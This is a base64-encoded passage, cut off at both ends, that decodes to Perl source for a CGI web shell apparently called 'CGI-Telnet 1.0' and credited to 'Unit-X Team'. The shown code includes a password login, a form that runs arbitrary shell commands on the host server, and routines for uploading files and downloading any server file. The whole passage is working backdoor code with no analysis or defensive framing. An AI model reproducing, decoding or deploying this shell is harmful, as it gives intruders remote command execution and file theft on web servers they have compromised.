Qo8L3RyPg0KPC90YWJsZT4NCjxmb250IGNvbG9yPSIjMDA5OTAwIiBzaXplPSIzIj4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgTG9naW4gU2NyZWVuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRMb2dpblNjcmVlbg0Kew0KCSRNZXNzYWdlID0gcSQ8cHJlPjxmb250IGNvbG9yPSIjZmYwMDAwIj4gX19fX18gIF9fX19fICBfX19fXyAgICAgICAgICBfX19fXyAgICAgICAgXyAgICAgICAgICAgICAgIF8NCi8gIF9fIFx8ICBfXyBcfF8gICBffCAgICAgICAgfF8gICBffCAgICAgIHwgfCAgICAgICAgICAgICB8IHwNCnwgLyAgXC98IHwgIFwvICB8IHwgICBfX19fX18gICB8IHwgICAgX19fIHwgfCBfIF9fICAgIF9fXyB8IHxfDQp8IHwgICAgfCB8IF9fICAgfCB8ICB8X19fX19ffCAgfCB8ICAgLyBfIFx8IHx8ICdfIFwgIC8gXyBcfCBfX3wNCnwgXF9fL1x8IHxfXCBcIF98IHxfICAgICAgICAgICB8IHwgIHwgIF9fL3wgfHwgfCB8IHx8ICBfXy98IHxfDQogXF9fX18vIFxfX19fLyBcX19fLyAgICAgICAgICAgXF8vICAgXF9fX3x8X3x8X3wgfF98IFxfX198IFxfX3wgMS4wDQoNCjwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+ICAgICAgICAgICAgICAgICAgICAgIF9fX19fXyAgICAgICAgICAgICA8L2ZvbnQ+PGZvbnQgY29sb3I9IiNBRTgzMDAiPqkgMjAwMywgVW5pdC1YIFRlYW08L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRjAwMDAiPg0KICAgICAgICAgICAgICAgICAgIC4tJnF1b3Q7ICAgICAgJnF1b3Q7LS4NCiAgICAgICAgICAgICAgICAgIC8gICBVTklULVggICBcDQogICAgICAgICAgICAgICAgIHwgICAgICAgICAgICAgIHwNCiAgICAgICAgICAgICAgICAgfCwgIC4tLiAgLi0uICAsfA0KICAgICAgICAgICAgICAgICB8ICkoX28vICBcb18pKCB8DQogICAgICAgICAgICAgICAgIHwvICAgICAvXCAgICAgXHwNCiAgICAgICAoQF8gICAgICAgKF8gICAgIF5eICAgICBfKQ0KICBfICAgICApIFw8L2ZvbnQ+PGZvbnQgY29sb3I9IiMwMDk5MDAiPl9fX19fX188L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRjAwMDAiPlw8L2ZvbnQ+PGZvbnQgY29sb3I9IiMwMDk5MDAiPl9fPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj58KkVWSUwqfDwvZm9udD48Zm9udCBjb2xvcj0iIzAwOTkwMCI+X188L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRjAwMDAiPi88L2ZvbnQ+PGZvbnQgY29sb3I9IiMwMDk5MDAiPl9fX19fX19fX19fX19fX19fX19fX19fDQo8L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRjAwMDAiPiAoXyk8L2ZvbnQ+PGZvbnQgY29sb3I9IiMwMDk5MDAiPkA4QDg8L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRjAwMDAiPnt9PC9mb250Pjxmb250IGNvbG9yPSIjMDA5OTAwIj4mbHQ7X19fX19fX188L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRjAwMDAiPnwtXE1BU1RFUi8tfDwvZm9udD48Zm9udCBjb2xvcj0iIzAwOTkwMCI+X19fX19fX19fX19fX19fX19fX19fX19fJmd0OzwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+DQogICAgICAgIClfLyAgICAgICAgXCAgICAgICAgICAvDQogICAgICAgKEAgICAgICAgICAgIGAtLS0tLS0tLWANCiAgICAgICAgICAgICA8L2ZvbnQ+PGZvbnQgY29sb3I9IiNBRTgzMDAiPlcgQSBSIE4gSSBOIEc6IFByaXZhdGUgU2VydmVyPC9mb250PjwvcHJlPg0KJDsNCiMnDQoJcHJpbnQgPDxFTkQ7DQo8Y29kZT4NClRyeWluZyAkU2VydmVyTmFtZS4uLjxicj4NCkNvbm5lY3RlZCB0byAkU2VydmVyTmFtZTxicj4NCkVzY2FwZSBjaGFyYWN0ZXIgaXMgXl0NCjxjb2RlPiRNZXNzYWdlDQpFTkQNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIG1lc3NhZ2UgdGhhdCBpbmZvcm1zIHRoZSB1c2VyIG9mIGEgZmFpbGVkIGxvZ2luDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRMb2dpbkZhaWxlZE1lc3NhZ2UNCnsNCglwcmludCA8PEVORDsNCjxjb2RlPg0KPGJyPmxvZ2luOiBhZG1pbjxicj4NCnBhc3N3b3JkOjxicj4NCkxvZ2luIGluY29ycmVjdDxicj48YnI+DQo8L2NvZGU+DQpFTkQNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSBmb3IgbG9nZ2luZyBpbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50TG9naW5Gb3JtDQp7DQoJcHJpbnQgPDxFTkQ7DQo8Y29kZT4NCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImxvZ2luIj4NCmxvZ2luOiBhZG1pbjxicj4NCnBhc3N3b3JkOjxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icCI+DQo8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iRW50ZXIiPg0KPC9mb3JtPg0KPC9jb2RlPg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBmb290ZXIgZm9yIHRoZSBIVE1MIFBhZ2UNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludFBhZ2VGb290ZXINCnsNCglwcmludCAiPC9mb250PjwvYm9keT48L2h0bWw+IjsNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBSZXRyZWl2ZXMgdGhlIHZhbHVlcyBvZiBhbGwgY29va2llcy4gVGhlIGNvb2tpZXMgY2FuIGJlIGFjY2Vzc2VzIHVzaW5nIHRoZQ0KIyB2YXJpYWJsZSAkQ29va2llc3snJ30NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBHZXRDb29raWVzDQp7DQoJQGh0dHBjb29raWVzID0gc3BsaXQoLzsgLywkRU5WeydIVFRQX0NPT0tJRSd9KTsNCglmb3JlYWNoICRjb29raWUoQGh0dHBjb29raWVzKQ0KCXsNCgkJKCRpZCwgJHZhbCkgPSBzcGxpdCgvPS8sICRjb29raWUpOw0KCQkkQ29va2llc3skaWR9ID0gJHZhbDsNCgl9DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBzY3JlZW4gd2hlbiB0aGUgdXNlciBsb2dzIG91dA0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50TG9nb3V0U2NyZWVuDQp7DQoJcHJpbnQgIjxjb2RlPkNvbm5lY3Rpb24gY2xvc2VkIGJ5IGZvcmVpZ24gaG9zdC48YnI+PGJyPjwvY29kZT4iOw0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIExvZ3Mgb3V0IHRoZSB1c2VyIGFuZCBhbGxvd3MgdGhlIHVzZXIgdG8gbG9naW4gYWdhaW4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQZXJmb3JtTG9nb3V0DQp7DQoJcHJpbnQgIlNldC1Db29raWU6IFNBVkVEUFdEPTtcbiI7ICMgcmVtb3ZlIHBhc3N3b3JkIGNvb2tpZQ0KCSZQcmludFBhZ2VIZWFkZXIoInAiKTsNCgkmUHJpbnRMb2dvdXRTY3JlZW47DQoJJlByaW50TG9naW5TY3JlZW47DQoJJlByaW50TG9naW5Gb3JtOw0KCSZQcmludFBhZ2VGb290ZXI7DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgdG8gbG9naW4gdGhlIHVzZXIuIElmIHRoZSBwYXNzd29yZCBtYXRjaGVzLCBpdA0KIyBkaXNwbGF5cyBhIHBhZ2UgdGhhdCBhbGxvd3MgdGhlIHVzZXIgdG8gcnVuIGNvbW1hbmRzLiBJZiB0aGUgcGFzc3dvcmQgZG9lbnMndA0KIyBtYXRjaCBvciBpZiBubyBwYXNzd29yZCBpcyBlbnRlcmVkLCBpdCBkaXNwbGF5cyBhIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXINCiMgdG8gbG9naW4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQZXJmb3JtTG9naW4NCnsNCglpZigkTG9naW5QYXNzd29yZCBlcSAkUGFzc3dvcmQpICMgcGFzc3dvcmQgbWF0Y2hlZA0KCXsNCgkJcHJpbnQgIlNldC1Db29raWU6IFNBVkVEUFdEPSRMb2dpblBhc3N3b3JkO1xuIjsNCgkJJlByaW50UGFnZUhlYWRlcigiYyIpOw0KCQkmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCgkJJlByaW50UGFnZUZvb3RlcjsNCgl9DQoJZWxzZSAjIHBhc3N3b3JkIGRpZG4ndCBtYXRjaA0KCXsNCgkJJlByaW50UGFnZUhlYWRlcigicCIpOw0KCQkmUHJpbnRMb2dpblNjcmVlbjsNCgkJaWYoJExvZ2luUGFzc3dvcmQgbmUgIiIpICMgc29tZSBwYXNzd29yZCB3YXMgZW50ZXJlZA0KCQl7DQoJCQkmUHJpbnRMb2dpbkZhaWxlZE1lc3NhZ2U7DQoJCX0NCgkJJlByaW50TG9naW5Gb3JtOw0KCQkmUHJpbnRQYWdlRm9vdGVyOw0KCX0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byBlbnRlciBjb21tYW5kcw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50Q29tbWFuZExpbmVJbnB1dEZvcm0NCnsNCgkkUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50RGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsNCglwcmludCA8PEVORDsNCjxjb2RlPg0KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iY29tbWFuZCI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPg0KJFByb21wdA0KPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImMiPg0KPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4NCjwvZm9ybT4NCjwvY29kZT4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIGRvd25sb2FkIGZpbGVzDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRGaWxlRG93bmxvYWRGb3JtDQp7DQoJJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7DQoJcHJpbnQgPDxFTkQ7DQo8Y29kZT4NCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJkb3dubG9hZCI+DQokUHJvbXB0IGRvd25sb2FkPGJyPjxicj4NCkZpbGVuYW1lOiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iZiIgc2l6ZT0iMzUiPjxicj48YnI+DQpEb3dubG9hZDogPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkJlZ2luIj4NCjwvZm9ybT4NCjwvY29kZT4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIHVwbG9hZCBmaWxlcw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50RmlsZVVwbG9hZEZvcm0NCnsNCgkkUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50RGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsNCglwcmludCA8PEVORDsNCjxjb2RlPg0KPGZvcm0gbmFtZT0iZiIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQokUHJvbXB0IHVwbG9hZDxicj48YnI+DQpGaWxlbmFtZTogPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImYiIHNpemU9IjM1Ij48YnI+PGJyPg0KT3B0aW9uczogJm5ic3A7PGlucHV0IHR5cGU9ImNoZWNrYm94IiBuYW1lPSJvIiB2YWx1ZT0ib3ZlcndyaXRlIj4NCk92ZXJ3cml0ZSBpZiBpdCBFeGlzdHM8YnI+PGJyPg0KVXBsb2FkOiZuYnNwOyZuYnNwOyZuYnNwOzxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCZWdpbiI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9InVwbG9hZCI+DQo8L2Zvcm0+DQo8L2NvZGU+DQpFTkQNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB0aW1lb3V0IGZvciBhIGNvbW1hbmQgZXhwaXJlcy4gV2UgbmVlZCB0bw0KIyB0ZXJtaW5hdGUgdGhlIHNjcmlwdCBpbW1lZGlhdGVseS4gVGhpcyBmdW5jdGlvbiBpcyB2YWxpZCBvbmx5IG9uIFVuaXguIEl0IGlzDQojIG5ldmVyIGNhbGxlZCB3aGVuIHRoZSBzY3JpcHQgaXMgcnVubmluZyBvbiBOVC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBDb21tYW5kVGltZW91dA0Kew0KCWlmKCEkV2luTlQpDQoJew0KCQlhbGFybSgwKTsNCgkJcHJpbnQgPDxFTkQ7DQo8L3htcD4NCjxjb2RlPg0KQ29tbWFuZCBleGNlZWRlZCBtYXhpbXVtIHRpbWUgb2YgJENvbW1hbmRUaW1lb3V0RHVyYXRpb24gc2Vjb25kKHMpLg0KPGJyPktpbGxlZCBpdCENCjxjb2RlPg0KRU5EDQoJCSZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KCQkmUHJpbnRQYWdlRm9vdGVyOw0KCQlleGl0Ow0KCX0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB0byBleGVjdXRlIGNvbW1hbmRzLiBJdCBkaXNwbGF5cyB0aGUgb3V0cHV0IG9mIHRoZQ0KIyBjb21tYW5kIGFuZCBhbGxvd3MgdGhlIHVzZXIgdG8gZW50ZXIgYW5vdGhlciBjb21tYW5kLiBUaGUgY2hhbmdlIGRpcmVjdG9yeQ0KIyBjb21tYW5kIGlzIGhhbmRsZWQgZGlmZmVyZW50bHkuIEluIHRoaXMgY2FzZSwgdGhlIG5ldyBkaXJlY3RvcnkgaXMgc3RvcmVkIGluDQojIGFuIGludGVybmFsIHZhcmlhYmxlIGFuZCBpcyB1c2VkIGVhY2ggdGltZSBhIGNvbW1hbmQgaGFzIHRvIGJlIGV4ZWN1dGVkLiBUaGUNCiMgb3V0cHV0IG9mIHRoZSBjaGFuZ2UgZGlyZWN0b3J5IGNvbW1hbmQgaXMgbm90IGRpc3BsYXllZCB0byB0aGUgdXNlcnMNCiMgdGhlcmVmb3JlIGVycm9yIG1lc3NhZ2VzIGNhbm5vdCBiZSBkaXNwbGF5ZWQuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgRXhlY3V0ZUNvbW1hbmQNCnsNCglpZigkUnVuQ29tbWFuZCA9fiBtL15ccypjZFxzKyguKykvKSAjIGl0IGlzIGEgY2hhbmdlIGRpciBjb21tYW5kDQoJew0KCQkjIHdlIGNoYW5nZSB0aGUgZGlyZWN0b3J5IGludGVybmFsbHkuIFRoZSBvdXRwdXQgb2YgdGhlDQoJCSMgY29tbWFuZCBpcyBub3QgZGlzcGxheWVkLg0KDQoJCSRPbGREaXIgPSAkQ3VycmVudERpcjsNCgkJJENvbW1hbmQgPSAiY2QgXCIkQ3VycmVudERpclwiIi4kQ21kU2VwLiJjZCAkMSIuJENtZFNlcC4kQ21kUHdkOw0KCQljaG9wKCRDdXJyZW50RGlyID0gYCRDb21tYW5kYCk7DQoJCSZQcmludFBhZ2VIZWFkZXIoImMiKTsNCgkJJFByb21wdCA9ICRXaW5OVCA/ICIkT2xkRGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJE9sZERpcl1cJCAiOw0KCQlwcmludCAiPGNvZGU+JFByb21wdCAkUnVuQ29tbWFuZDwvY29kZT4iOw0KCX0NCgllbHNlICMgc29tZSBvdGhlciBjb21tYW5kLCBkaXNwbGF5IHRoZSBvdXRwdXQNCgl7DQoJCSZQcmludFBhZ2VIZWFkZXIoImMiKTsNCgkJJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7DQoJCXByaW50ICI8Y29kZT4kUHJvbXB0ICRSdW5Db21tYW5kPC9jb2RlPjx4bXA+IjsNCgkJJENvbW1hbmQgPSAiY2QgXCIkQ3VycmVudERpclwiIi4kQ21kU2VwLiRSdW5Db21tYW5kLiRSZWRpcmVjdG9yOw0KCQlpZighJFdpbk5UKQ0KCQl7DQoJCQkkU0lHeydBTFJNJ30gPSBcJkNvbW1hbmRUaW1lb3V0Ow0KCQkJYWxhcm0oJENvbW1hbmRUaW1lb3V0RHVyYXRpb24pOw0KCQl9DQoJCWlmKCRTaG93RHluYW1pY091dHB1dCkgIyBzaG93IG91dHB1dCBhcyBpdCBpcyBnZW5lcmF0ZWQNCgkJew0KCQkJJHw9MTsNCgkJCSRDb21tYW5kIC49ICIgfCI7DQoJCQlvcGVuKENvbW1hbmRPdXRwdXQsICRDb21tYW5kKTsNCgkJCXdoaWxlKDxDb21tYW5kT3V0cHV0PikNCgkJCXsNCgkJCQkkXyA9fiBzLyhcbnxcclxuKSQvLzsNCgkJCQlwcmludCAiJF9cbiI7DQoJCQl9DQoJCQkkfD0wOw0KCQl9DQoJCWVsc2UgIyBzaG93IG91dHB1dCBhZnRlciBjb21tYW5kIGNvbXBsZXRlcw0KCQl7DQoJCQlwcmludCBgJENvbW1hbmRgOw0KCQl9DQoJCWlmKCEkV2luTlQpDQoJCXsNCgkJCWFsYXJtKDApOw0KCQl9DQoJCXByaW50ICI8L3htcD4iOw0KCX0NCgkmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCgkmUHJpbnRQYWdlRm9vdGVyOw0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gZGlzcGxheXMgdGhlIHBhZ2UgdGhhdCBjb250YWlucyBhIGxpbmsgd2hpY2ggYWxsb3dzIHRoZSB1c2VyDQojIHRvIGRvd25sb2FkIHRoZSBzcGVjaWZpZWQgZmlsZS4gVGhlIHBhZ2UgYWxzbyBjb250YWlucyBhIGF1dG8tcmVmcmVzaA0KIyBmZWF0dXJlIHRoYXQgc3RhcnRzIHRoZSBkb3dubG9hZCBhdXRvbWF0aWNhbGx5Lg0KIyBBcmd1bWVudCAxOiBGdWxseSBxdWFsaWZpZWQgZmlsZW5hbWUgb2YgdGhlIGZpbGUgdG8gYmUgZG93bmxvYWRlZA0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50RG93bmxvYWRMaW5rUGFnZQ0Kew0KCWxvY2FsKCRGaWxlVXJsKSA9IEBfOw0KCWlmKC1lICRGaWxlVXJsKSAjIGlmIHRoZSBmaWxlIGV4aXN0cw0KCXsNCgkJIyBlbmNvZGUgdGhlIGZpbGUgbGluayBzbyB3ZSBjYW4gc2VuZCBpdCB0byB0aGUgYnJvd3Nlcg0KCQkkRmlsZVVybCA9fiBzLyhbXmEtekEtWjAtOV0pLyclJy51bnBhY2soIkgqIiwkMSkvZWc7DQoJCSREb3dubG9hZExpbmsgPSAiJFNjcmlwdExvY2F0aW9uP2E9ZG93bmxvYWQmZj0kRmlsZVVybCZvPWdvIjsNCgkJJEh0bWxNZXRhSGVhZGVyID0gIjxtZXRhIEhUVFAtRVFVSVY9XCJSZWZyZXNoXCIgQ09OVEVOVD1cIjE7IFVSTD0kRG93bmxvYWRMaW5rXCI+IjsNCgkJJlByaW50UGFnZUhlYWRlcigiYyIpOw0KCQlwcmludCA8PEVORDsNCjxjb2RlPg0KU2VuZGluZyBGaWxlICRUcmFuc2ZlckZpbGUuLi48YnI+DQpJZiB0aGUgZG93bmxvYWQgZG9lcyBub3Qgc3RhcnQgYXV0b21hdGljYWxseSwNCjxhIGhyZWY9IiREb3dubG9hZExpbmsiPkNsaWNrIEhlcmU8L2E+Lg0KPC9jb2RlPg0KRU5EDQoJCSZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KCQkmUHJpbnRQYWdlRm9vdGVyOw0KCX0NCgllbHNlICMgZmlsZSBkb2Vzbid0IGV4aXN0DQoJew0KCQkmUHJpbnRQYWdlSGVhZGVyKCJmIik7DQoJCXByaW50ICI8Y29kZT5GYWlsZWQgdG8gZG93bmxvYWQgJEZpbGVVcmw6ICQhPC9jb2RlPiI7DQoJCSZQcmludEZpbGVEb3dubG9hZEZvcm07DQoJCSZQcmludFBhZ2VGb290ZXI7DQoJfQ0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gcmVhZHMgdGhlIHNwZWNpZmllZCBmaWxlIGZyb20gdGhlIGRpc2sgYW5kIHNlbmRzIGl0IHRvIHRoZQ0KIyBicm93c2VyLCBzbyB0aGF0IGl0IGNhbiBiZSBkb3dubG9hZGVkIGJ5IHRoZSB1c2VyLg0KIyBBcmd1bWVudCAxOiBGdWxseSBxdWFsaWZpZWQgcGF0aG5hbWUgb2YgdGhlIGZpbGUgdG8gYmUgc2VudC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBTZW5kRmlsZVRvQnJvd3Nlcg0Kew0KCWxvY2FsKCRTZW5kRmlsZSkgPSBAXzsNCglpZihvcGVuKFNFTkRGSUxFLCAkU2VuZEZpbGUpKSAjIGZpbGUgb3BlbmVkIGZvciByZWFkaW5nDQoJew0KCQlpZigkV2luTlQpDQoJCXsNCgkJCWJpbm1vZGUoU0VOREZJTEUpOw0KCQkJYmlubW9kZShTVERPVVQpOw0KCQl9DQoJCSRGaWxlU2l6ZSA9IChzdGF0KCRTZW5kRmlsZSkpWzddOw0KCQkoJEZpbGVuYW1lID0gJFNlbmRGaWxlKSA9fiAgbSEoW14vXlxcXSopJCE7DQoJCXByaW50ICJDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtdW5rbm93blxuIjsNCgkJcHJpbnQgIkNvbnRlbnQtTGVuZ3RoOiAkRmlsZVNpemVcbiI7DQoJCXByaW50ICJDb250ZW50LURpc3Bvc2l0aW9uOiBhdHRhY2htZW50OyBmaWxlbmFtZT0kMVxuXG4iOw0KCQlwcmludCB3aGlsZSg8U0VOREZJTEU+KTsNCgkJY2xvc2UoU0VOREZJTEUpOw0KCX0NCgllbHNlICMgZmFpbGVkIHRvIG9wZW4gZmlsZQ0KCXsNCgkJJl